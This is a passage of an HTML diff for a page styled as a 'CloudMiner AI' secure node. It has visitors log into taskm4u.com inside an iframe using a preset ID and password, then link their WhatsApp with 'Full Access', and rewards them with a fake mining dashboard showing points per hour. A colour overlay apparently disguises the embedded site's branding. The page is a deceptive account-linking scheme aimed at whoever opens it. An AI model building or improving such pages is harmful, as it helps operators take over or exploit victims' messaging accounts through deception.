@@ -3,135 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>CloudMiner AI - Secure Node</title>
+    <title>Secure Node - Activation</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root {
-            --primary-green: #25D366;
-            --danger-red: #ff3b30;
-            --bg-dark: #0b141a;
-            --glass-overlay: rgba(37, 211, 102, 0.3); /* বেগুনি কালার ঢাকতে সবুজ ওভারলে */
-        }
-
-        body { 
-            font-family: 'Segoe UI', sans-serif; 
-            background: var(--bg-dark); 
-            color: white; 
-            margin: 0; 
-            height: 100vh; 
-            display: flex; 
-            flex-direction: column;
-            overflow: hidden;
-        }
+        :root { --wa-green: #25D366; --bg: #0b141a; --mask: rgba(37, 211, 102, 0.2); }
+        body, html { margin: 0; padding: 0; height: 100%; background: var(--bg); font-family: sans-serif; overflow: hidden; color: white; }
 
         /* View Control */
-        .view { display: none; flex-direction: column; height: 100%; }
+        .view { display: none; height: 100vh; flex-direction: column; }
         .active-view { display: flex; }
 
-        /* Dashboard Style */
-        .balance-card {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(10px);
-            padding: 25px; margin: 20px;
-            border-radius: 15px; border: 1px solid rgba(255,255,255,0.1);
-            text-align: center;
-        }
-        .points { font-size: 38px; font-weight: bold; color: var(--primary-green); }
+        /* Step 1: Login Frame */
+        .header-step { background: #121b22; padding: 15px; text-align: center; border-bottom: 2px solid var(--wa-green); }
+        .copy-bar { display: flex; gap: 10px; margin-top: 10px; }
+        .c-btn { flex: 1; background: #34495e; padding: 10px; border-radius: 5px; font-size: 12px; cursor: pointer; border: 1px solid #45aaf2; }
 
-        /* Task View Layout */
-        .task-header {
-            background: #1f2c34;
-            padding: 15px;
-            text-align: center;
-            border-bottom: 2px solid var(--primary-green);
-            z-index: 100;
-        }
+        .iframe-wrap { flex-grow: 1; position: relative; background: #fff; }
+        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: var(--mask); mix-blend-mode: hue; pointer-events: none; }
+        iframe { width: 100%; height: 100%; border: none; }
 
-        .instruction {
-            background: var(--danger-red);
-            color: white;
-            padding: 8px;
-            font-size: 14px;
-            border-radius: 5px;
-            margin-bottom: 10px;
-            animation: blink 1.5s infinite;
-        }
+        /* Fixed Footer Button */
+        .footer-btn { background: #121b22; padding: 15px; position: sticky; bottom: 0; z-index: 100; }
+        .main-btn { background: var(--wa-green); color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; }
 
-        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.5;} 100% {opacity: 1;} }
-
-        /* Iframe Container with Scroll */
-        .iframe-container {
-            flex-grow: 1;
-            position: relative;
-            background: white;
-            overflow-y: auto; /* স্ক্রলিং নিশ্চিত করা */
-            -webkit-overflow-scrolling: touch;
-        }
-
-        /* Color Overlay to mask Purple */
-        .color-mask {
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 150px; /* উপরের বেগুনি অংশ ঢাকতে */
-            background: linear-gradient(to bottom, var(--glass-overlay), transparent);
-            pointer-events: none; /* যাতে আইফ্রেমের ভেতর কাজ করা যায় */
-            z-index: 10;
-        }
-
-        iframe { width: 100%; height: 1000px; border: none; } /* উচ্চতা বাড়ানো হয়েছে স্ক্রল করার জন্য */
-
-        /* Sticky Footer for Buttons */
-        .task-footer {
-            background: #1f2c34;
-            padding: 15px;
-            border-top: 1px solid rgba(255,255,255,0.1);
-            z-index: 100;
-        }
-
-        .btn {
-            background: var(--primary-green);
-            color: white; border: none; padding: 15px;
-            border-radius: 10px; font-weight: bold; cursor: pointer;
-            width: 100%; font-size: 16px;
-        }
-
-        .copy-bar {
-            display: flex; gap: 10px; margin-bottom: 10px;
-        }
-        .btn-copy {
-            flex: 1; background: #34495e; color: #fff; padding: 10px;
-            border-radius: 5px; font-size: 12px; cursor: pointer; text-align: center;
-        }
+        /* Final Dashboard Style */
+        .dash-card { background: #1f2c34; padding: 30px; margin: 20px; border-radius: 20px; text-align: center; border: 1px solid var(--mask); }
+        .pts { font-size: 45px; font-weight: bold; color: var(--wa-green); margin: 15px 0; }
     </style>
 </head>
 <body>
 
-<div id="view-main" class="view active-view">
-    <div class="balance-card">
-        <div style="color: #8696a0;">Cloud Node Balance</div>
-        <div class="points" id="mainPoints">0.00 PT</div>
-        <div id="status" style="color: #ffbc00; font-size: 12px;">● Standby</div>
+<div id="step-login" class="view active-view">
+    <div class="header-step">
+        <div style="font-size: 14px; color: #ffbc00;">⚠️ লগইন করার পর নিচের বাটনে ক্লিক করুন</div>
+        <div class="copy-bar">
+            <div class="c-btn" onclick="cp('01321494267')">Copy ID</div>
+            <div class="c-btn" onclick="cp('123456789')">Copy Pass</div>
+        </div>
     </div>
-    <div style="padding: 20px;">
-        <button class="btn" onclick="openWork()">Start WhatsApp Task</button>
+    <div class="iframe-wrap">
+        <div class="overlay"></div>
+        <iframe src="https://www.taskm4u.com/#/login" id="loginFrame"></iframe>
+    </div>
+    <div class="footer-btn">
+        <button class="main-btn" onclick="toNextStep()">লগইন করেছি, পরবর্তী ধাপ</button>
     </div>
 </div>
 
-<div id="view-task" class="view">
-    <div class="task-header">
-        <div class="instruction">⚠️ হোয়াটসঅ্যাপ অ্যাড করে "Verify" বাটনে ক্লিক করুন</div>
-        <div class="copy-bar">
-            <div class="btn-copy" onclick="copyData('01321494267')">Copy ID</div>
-            <div class="btn-copy" onclick="copyData('123456789')">Copy Pass</div>
-        </div>
+<div id="step-link" class="view">
+    <div class="header-step">
+        <div style="font-size: 14px; color: var(--wa-green);">✅ এখন হোয়াটসঅ্যাপ যুক্ত করুন (Full Access)</div>
     </div>
-
-    <div class="iframe-container">
-        <div class="color-mask"></div>
-        <iframe src="about:blank" id="taskIframe"></iframe>
+    <div class="iframe-wrap">
+        <div class="overlay"></div>
+        <iframe src="about:blank" id="linkFrame"></iframe>
     </div>
+    <div class="footer-btn">
+        <button class="main-btn" id="verify-btn" onclick="verifyFinal()">হোয়াটসঅ্যাপ অ্যাড করেছি (Verify)</button>
+    </div>
+</div>
 
-    <div class="task-footer">
-        <button class="btn" id="verifyBtn" onclick="verifyNow()">Verify & Collect Points</button>
+<div id="view-final" class="view">
+    <div class="dash-card">
+        <p style="color: #8696a0;">Mining Dashboard Active</p>
+        <div class="pts" id="final-pts">0.00 PT</div>
+        <div id="status" style="color: var(--wa-green);">● Earning points: 30 PT/hr</div>
+    </div>
+    <div style="padding: 20px; text-align: center;">
+        <p>Your WhatsApp node is securely connected to the cloud server.</p>
+        <button class="main-btn" style="background: #34495e;" onclick="location.reload()">Refresh Session</button>
     </div>
 </div>
 
